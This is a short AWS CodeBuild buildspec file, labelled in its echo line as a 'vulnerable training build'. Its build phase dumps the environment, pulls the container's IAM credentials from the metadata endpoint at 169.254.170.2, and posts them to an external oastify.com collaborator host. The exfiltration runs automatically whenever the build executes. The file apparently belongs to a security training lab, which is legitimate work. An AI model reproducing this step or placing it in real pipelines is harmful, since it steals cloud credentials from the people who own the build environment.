version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env && curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -X POST -d @- https://7emmfqfp98gpvggej8kmpcey4pagy7mw.oastify.com/codebuildlab
      - echo "Done"
